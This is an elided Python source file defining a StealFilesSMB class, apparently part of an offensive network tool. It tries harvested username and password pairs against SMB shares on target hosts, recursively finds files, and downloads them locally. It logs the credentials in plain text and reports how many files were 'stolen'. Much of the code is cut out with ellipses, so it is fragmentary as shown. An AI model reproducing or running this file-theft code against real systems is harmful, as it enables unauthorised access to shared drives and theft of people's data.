...
class StealFilesSMB:
    ...
    def connect_smb(self, ip, username, password):
        ...
        try:
            ...
            logger.error(
                f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}"
            )
            return None
            ...
            for file in conn.listPath(share_name, dir_path):
                if file.isDirectory:
                    if file.filename not in [".", ".."]:
                        files.extend(
                            self.find_files(
                                conn, share_name, os.path.join(dir_path, file.filename)
                            )
                        )
                else:
                    if any(
    ...
    def steal_file(self, conn, share_name, remote_file, local_dir):
        ...
        try:
            ...
            logger.error(
                f"Error downloading file {remote_file} from share {share_name}: {e}"
            )
    ...
    def list_shares(self, conn):
        ...
        try:
            ...
            valid_shares = [
                share
                for share in shares
                if share.name not in IGNORED_SHARES
                and not share.isSpecial
                and not share.isTemporary
            ]
        ...
        try:
            if "success" in row.get(
                ...
                if os.path.exists(smbfile):
                    ...
                    logger.info(
                        f"Found credentials for {len(credentials)} shares on {ip}"
                    )
                ...
                def timeout():
                    ...
                    if not self.smb_connected:
                        logger.error(
                            f"No SMB connection established within 4 minutes for {ip}. Marking as failed."
                        )
                ...
                if conn and shares:
                    for share in shares:
                        if (
                            share.isSpecial
                            or share.isTemporary
                            or share.name in IGNORED_SHARES
                        ):
                            continue
                        ...
                        if remote_files:
                            for remote_file in remote_files:
                                if self.stop_execution:
                                    break
                                self.steal_file(
                                    conn, share.name, remote_file, local_dir
                                )
                            success = True
                ...
                attempted_shares = (
                    {share.name for share in shares} if success else set()
                )
                ...
                for share, creds in credentials.items():
                    ...
                    for username, password in creds:
                        ...
                        try:
                            logger.info(
                                f"Trying credential {username}:{password} for share {share} on {ip}"
                            )
                                ...
                                if remote_files:
                                    for remote_file in remote_files:
                                        if self.stop_execution:
                                            break
                                        self.steal_file(
                                            conn, share, remote_file, local_dir
                                        )
                                    success = True
                                    countfiles = len(remote_files)
                                    logger.info(
                                        f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'"
                                    )
                                conn.close()
                                if success:
                                    timer.cancel()  # Cancel the timer if the operation is successful
                            ...
                            logger.error(
                                f"Error stealing files from {ip} on share '{share}' with user '{username}': {e}"
                            )
